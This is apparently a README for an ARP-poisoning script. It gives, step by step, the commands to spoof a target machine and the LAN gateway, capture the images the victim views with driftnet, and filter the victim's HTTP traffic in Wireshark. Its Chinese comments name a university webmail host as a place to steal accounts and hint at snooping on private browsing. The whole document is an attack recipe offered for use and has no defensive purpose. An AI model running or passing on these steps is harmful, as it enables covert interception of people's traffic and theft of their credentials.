_______________________PreRequests: ____________________________________
|  $ Python 2.7 with Scapy 						                        |
|  $ Driftnet								                            |
|  $ Wireshark								                            |
|  $ Linux Environment with Root Access				                    |
|  $ Your Computer and Target are in the same LAN			            |
|  $ HINT: change wlp2s0,target_ip into proper value			        |
|_______________________________________________________________________|

 _________________________ARP Poison____________________________________
|  $ sudo sysctl net.ipv4.ip_forward=1					                |
|  $ 开启IP转发功能							                            |
|  $ sudo python arpPoison.py -i wlp2s0 -t target_ip -m rep 192.168.1.1	|
|  $ 欺骗TargetIP，使其认为网关是本机IP					                    |
|  $ sudo python arpPoison.py -i wlp2s0 -t 192.168.1.1 target_ip	    |
|  $ 欺骗网关，使其认为targetIP是本机IP					                    |
|_______________________Poison Finished_________________________________|

_______________________View Picture(Use Driftnet)_______________________
| $ driftnet -i wlp2s0							                        |
| $ 提取TargetIP访问的图片信息,在本机查看(不要多想...			                |
|_______________________________________________________________________|

 ——————————————————————View HTTP(Use Wireshark)_________________________
| $ sudo wireshark							                            |
| $ filter:http and ip.src= target_ip					                |
| $ 设置Wireshark中的过滤器，查看targetIP的所有HTTP链接			          |
| $ 可以通过查看mail.pku.edu.cn来实现盗号...作为小例子			             |
|_______________________________________________________________________|

Bingo...
